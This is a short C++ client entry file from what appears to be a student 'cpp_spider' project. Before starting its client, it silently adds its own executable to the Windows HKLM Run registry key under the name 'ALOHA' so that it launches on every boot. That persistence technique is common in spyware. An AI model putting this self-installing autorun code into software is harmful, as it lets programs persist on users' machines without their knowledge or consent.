/*
** ClientMain.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/ClientMain.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 10:58:28 2017 Maxime PILLON
** Last update Thu Oct 05 10:58:28 2017 Maxime PILLON
*/

#include	<windows.h>
#include 	"ClientCore.hpp"

void		autorun()
{
  char		buffer[MAX_PATH];
  HKEY		hkey;
  long		check;
  LPCTSTR	lpSubKey = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
  const size_t	length = MAX_PATH * 2;
  char		test[length] = {};

  GetModuleFileName(nullptr, buffer, MAX_PATH);
  check = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
			  lpSubKey,
			  0, nullptr, 0,
			  (KEY_WRITE|KEY_READ), nullptr, &hkey, nullptr);
  strcpy_s(test, length, "\"");
  strcat_s(test, length, buffer);
  strcat_s(test, length, "\"\0");
  LPCTSTR name = TEXT("ALOHA");
  if (check == ERROR_SUCCESS)
    RegSetValueEx(hkey, name, 0, REG_SZ, (BYTE *)test, strlen(test)+1);
  if (hkey != nullptr)
    RegCloseKey(hkey);
}

int			main()
{
  spider::ClientCore	client;

  autorun();
  client.run();
  return 0;
}